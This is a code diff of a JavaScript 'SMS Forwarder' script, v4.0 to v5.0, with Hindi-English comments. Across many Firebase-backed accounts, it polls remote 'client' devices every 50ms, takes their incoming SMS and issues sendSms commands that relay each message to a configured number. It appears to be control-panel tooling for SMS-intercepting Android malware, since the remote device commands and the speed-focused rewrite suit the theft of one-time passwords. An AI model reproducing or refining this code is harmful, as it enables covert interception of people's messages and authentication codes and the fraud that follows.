@@ -1,18 +1,16 @@
 /* ============================================================
-   ANANYA SMS Forwarder v4.0
-   - Sirf enabledAt ke BAAD ke messages forward karega
-   - Purane messages skip karega
-   - Continuous chalta rahega, toggle nahi chahiye
+   ANANYA SMS Forwarder v5.0 — Ultra Fast Mode
+   Polling: 50ms + Parallel processing
    ============================================================ */
 
 (function () {
     'use strict';
 
-    console.log('[SMS-FWD] v4.0 Loaded ✅');
+    console.log('[SMS-FWD] v5.0 Ultra Fast ✅');
 
     var ACCOUNTS_KEY = 'flixy_accounts';
-    var PROCESSED_KEY = 'sms_fwd_v4';
-    var POLL_INTERVAL = 20;  // 2 sec
+    var PROCESSED_KEY = 'sms_fwd_v5';
+    var POLL_INTERVAL = 50;  // ← 50ms — ultra fast
 
     function getAccounts() {
         try {
@@ -54,7 +52,6 @@
         } catch (e) { return false; }
     }
 
-    // ============ PROCESSED TRACKER ============
     var processed = new Set();
     try {
         var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
@@ -69,10 +66,8 @@
         } catch (e) {}
     }
 
-    // ============ TIMESTAMP EXTRACTOR ============
     function getMsgTimestamp(sms) {
         if (!sms) return 0;
-        // Try different timestamp fields
         if (sms.timestamp && typeof sms.timestamp === 'number') return sms.timestamp;
         if (sms.dateTime) {
             var t = new Date(sms.dateTime).getTime();
@@ -82,110 +77,94 @@
             var t2 = new Date(sms.time).getTime();
             if (!isNaN(t2)) return t2;
         }
-        return 0;  // unknown → treat as old
+        return 0;
     }
 
-    // ============ CORE — PROCESS ONLY NEW MESSAGES ============
+    // ============ ULTRA FAST — No await, parallel writes ============
     async function handleDevice(acc, devId) {
         try {
-            // 1. Get forwarding config
             var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
-            if (!cfg) return;
-            if (!cfg.enabled) return;
-            if (!cfg.forwardTo) return;
+            if (!cfg || !cfg.enabled || !cfg.forwardTo) return;
 
             var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
             var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
-            var enabledAt = cfg.enabledAt || 0;  // ← ye naya field hai
-
+            var enabledAt = cfg.enabledAt || 0;
             if (!to) return;
 
-            // 2. Get messages
             var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
             if (!msgs || typeof msgs !== 'object') return;
 
             var ids = Object.keys(msgs);
             if (!ids.length) return;
-
             ids.sort(function (a, b) { return Number(a) - Number(b); });
 
-            // 3. Sirf LAST 5 messages check karo (safety)
-            //    But filter by enabledAt
-            var scanLimit = Math.min(5, ids.length);
+            var scanLimit = Math.min(3, ids.length);  // sirf 3 check
             var startIdx = ids.length - scanLimit;
 
             for (var i = startIdx; i < ids.length; i++) {
                 var msgId = ids[i];
                 var k = devId + '_' + msgId;
-
                 if (processed.has(k)) continue;
 
                 var sms = msgs[msgId];
                 if (!sms) { markDone(k); continue; }
                 if (sms.type !== 'incoming') { markDone(k); continue; }
 
-                // 4. ✅ MAIN FILTER — sirf naye messages forward karo
                 var msgTime = getMsgTimestamp(sms);
-
-                // Agar message ka time enabledAt se pehle ka hai → skip
                 if (enabledAt > 0 && msgTime > 0 && msgTime < enabledAt) {
                     markDone(k);
-                    console.log('[SMS-FWD] ⏭ Skipped old msg:', msgId);
                     continue;
                 }
 
                 var text = sms.message || sms.body || sms.text || '';
                 if (!text) { markDone(k); continue; }
 
-                // ======== FORWARD ========
+                // ⚡ INSTANT — mark processed immediately (avoid re-scan)
+                markDone(k);
+
                 var ts = Date.now();
                 var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
                 var sim = { simSlot: simSlot };
 
-                console.log('[SMS-FWD] 📤 Forwarding:', sms.sender || 'Unknown', '→', to);
+                console.log('[SMS-FWD] ⚡ Fast forward:', sms.sender || 'Unknown', '→', to);
 
-                // PATH 1: webhookEvent/sendSms
-                await fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
-                    to: to, message: text, isSended: false,
-                    timestamp: ts, commandId: cid, simInfo: sim,
-                    forwarded: true, originalSender: sms.sender || 'Unknown'
+                // ⚡ PARALLEL — sab writes ek saath (await NAHI)
+                Promise.all([
+                    fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
+                        to: to, message: text, isSended: false,
+                        timestamp: ts, commandId: cid, simInfo: sim,
+                        forwarded: true, originalSender: sms.sender || 'Unknown'
+                    }),
+                    fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
+                        targetNumber: to, message: text, timestamp: ts,
+                        status: 'pending', id: cid, simInfo: sim, forwarded: true
+                    }),
+                    fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
+                        sender: 'FORWARDER',
+                        message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
+                        dateTime: ts, timestamp: ts, type: 'outgoing',
+                        targetNumber: to, commandId: cid, status: 'pending',
+                        simInfo: sim, forwarded: true
+                    }),
+                    fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
+                        to: to, text: text, timestamp: ts, status: 'pending',
+                        commandId: cid, forwarded: true
+                    })
+                ]).then(function() {
+                    console.log('[SMS-FWD] ✅ Sent:', sms.sender || 'Unknown');
+                }).catch(function(e) {
+                    console.error('[SMS-FWD] Write error:', e.message);
                 });
-
-                // PATH 2: commands/sendSms
-                await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
-                    targetNumber: to, message: text, timestamp: ts,
-                    status: 'pending', id: cid, simInfo: sim, forwarded: true
-                });
-
-                // PATH 3: messages (log)
-                await fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
-                    sender: 'FORWARDER',
-                    message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
-                    dateTime: ts, timestamp: ts, type: 'outgoing',
-                    targetNumber: to, commandId: cid, status: 'pending',
-                    simInfo: sim, forwarded: true
-                });
-
-                // PATH 4: sms
-                await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
-                    to: to, text: text, timestamp: ts, status: 'pending',
-                    commandId: cid, forwarded: true
-                });
-
-                markDone(k);
-                console.log('[SMS-FWD] ✅ Forwarded:', sms.sender || 'Unknown', '→', to);
             }
-
         } catch (e) {
             console.error('[SMS-FWD] Error:', e.message);
         }
     }
 
-    // ============ MAIN LOOP ============
     var busy = false;
 
     async function tick() {
-        if (busy) return;
+        if (busy) return;  // Agar previous cycle chal raha hai toh skip
         busy = true;
         try {
             var accs = getAccounts();
@@ -207,8 +186,9 @@
     }
 
     setInterval(tick, POLL_INTERVAL);
-    setTimeout(tick, 2000);
+    setTimeout(tick, 1000);
 
-    console.log('[SMS-FWD] v4.0 Running 🚀 — sirf naye messages forward honge');
+    console.log('[SMS-FWD] v5.0 Running every', POLL_INTERVAL, 'ms ⚡');
+    console.log('[SMS-FWD] Ultra fast mode — instant forward!');
 
 })();
